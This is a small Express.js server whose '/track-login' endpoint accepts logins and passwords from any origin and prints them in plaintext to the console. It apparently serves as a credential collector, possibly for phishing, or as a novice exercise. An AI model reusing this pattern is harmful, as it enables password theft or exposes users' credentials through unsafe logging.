const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
const PORT = 3000;

app.use(cors());
app.use(bodyParser.json());

app.post("/track-login", (req, res) => {
    const { login, password } = req.body;

		console.log("Success!")
    console.log("Login:", login);
    console.log("Password:", password);

    res.json({ message: "Дані отримані успішно!" });
});

app.listen(PORT, () => {
    console.log(`Server is running http://localhost:${PORT}`);
});